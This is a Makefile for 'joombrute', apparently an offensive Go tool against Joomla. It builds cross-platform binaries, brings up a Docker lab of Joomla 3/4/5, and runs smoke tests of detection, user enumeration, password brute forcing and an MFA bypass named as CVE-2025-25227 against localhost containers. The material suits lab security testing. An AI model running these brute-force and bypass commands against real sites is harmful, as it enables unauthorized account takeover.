# joombrute build targets.
#
#   make - native build
#   make all - cross-compile for linux/darwin/windows on amd64+arm64
#   make lab - bring lab containers up + install Joomla 3/4/5
#   make lab-down - tear lab down
#   make test - go test ./...
#   make smoke - end-to-end smoke against the lab
#   make clean

BIN      := bin/joombrute
PKG      := ./cmd/joombrute
LDFLAGS  := -s -w
GO       ?= go

.PHONY: all build clean test smoke lab lab-down vet fmt
.DEFAULT_GOAL := build

build:
	mkdir -p bin
	$(GO) build -ldflags "$(LDFLAGS)" -o $(BIN) $(PKG)

# Cross-compile matrix for release.
all: build
	mkdir -p dist
	CGO_ENABLED=0 GOOS=linux   GOARCH=amd64 $(GO) build -ldflags "$(LDFLAGS)" -o dist/joombrute-linux-amd64   $(PKG)
	CGO_ENABLED=0 GOOS=linux   GOARCH=arm64 $(GO) build -ldflags "$(LDFLAGS)" -o dist/joombrute-linux-arm64   $(PKG)
	CGO_ENABLED=0 GOOS=darwin  GOARCH=amd64 $(GO) build -ldflags "$(LDFLAGS)" -o dist/joombrute-darwin-amd64  $(PKG)
	CGO_ENABLED=0 GOOS=darwin  GOARCH=arm64 $(GO) build -ldflags "$(LDFLAGS)" -o dist/joombrute-darwin-arm64  $(PKG)
	CGO_ENABLED=0 GOOS=windows GOARCH=amd64 $(GO) build -ldflags "$(LDFLAGS)" -o dist/joombrute-windows-amd64.exe $(PKG)

test:
	$(GO) test ./...

vet:
	$(GO) vet ./...

fmt:
	$(GO) fmt ./...

clean:
	rm -rf bin dist

# --- Lab targets ----------------------------------------------------------

lab:
	docker compose -f lab/docker-compose.yml up -d
	@echo "waiting 20s for containers to settle..."
	@sleep 20
	bash lab/install.sh

lab-mfa:
	@echo "seeding TOTP secret on J4 admin user (for mfa-brute / mfa-bypass tests)..."
	docker cp lab/seed_mfa.php joombrute-j4:/tmp/seed_mfa.php
	docker exec joombrute-j4 php /tmp/seed_mfa.php

lab-mfa-off:
	docker exec joombrute-j4-db mysql -uroot -prootpass joomla \
	  -e "DELETE FROM jos_user_mfa WHERE user_id = 700;"

lab-down:
	docker compose -f lab/docker-compose.yml down -v

# End-to-end smoke test against the lab. Assumes `make lab` is up.
# `make smoke` clears MFA first so brute returns success (not mfa-required)
# across all three boxes. Use `make smoke-mfa` for the MFA scenarios.
smoke: build lab-mfa-off
	@echo "=== detect ==="
	$(BIN) detect -u http://localhost:8310
	$(BIN) detect -u http://localhost:8420
	$(BIN) detect -u http://localhost:8500
	@echo "=== enum (J4.2.7 should leak; J5 should not) ==="
	$(BIN) enum -u http://localhost:8420
	$(BIN) enum -u http://localhost:8500
	@echo "=== brute (admin:admin1234 expected) ==="
	$(BIN) brute -u http://localhost:8310 --user admin -w testdata/pw.txt -c 4
	$(BIN) brute -u http://localhost:8420 --user admin -w testdata/pw.txt -c 4
	$(BIN) brute -u http://localhost:8500 --user admin -w testdata/pw.txt -c 4
	@echo "=== chain (full auto, no MFA) ==="
	$(BIN) chain -u http://localhost:8420 -w testdata/pw.txt -c 4

# MFA scenarios: seed TOTP on J4 admin, then run brute -> mfa-required,
# mfa-bypass (CVE-2025-25227), and chain -> auto bypass pivot.
smoke-mfa: build lab-mfa
	@echo "=== brute on J4 - expect mfa-required ==="
	$(BIN) brute -u http://localhost:8420 --user admin -w testdata/pw.txt -c 4 --stop-on-mfa
	@echo "=== mfa-bypass (CVE-2025-25227) - expect VULNERABLE on J4.2.7 ==="
	$(BIN) mfa-bypass -u http://localhost:8420 --user admin --password admin1234
	@echo "=== chain - expect auto pivot to CVE-2025-25227 ==="
	$(BIN) chain -u http://localhost:8420 -w testdata/pw.txt -c 4
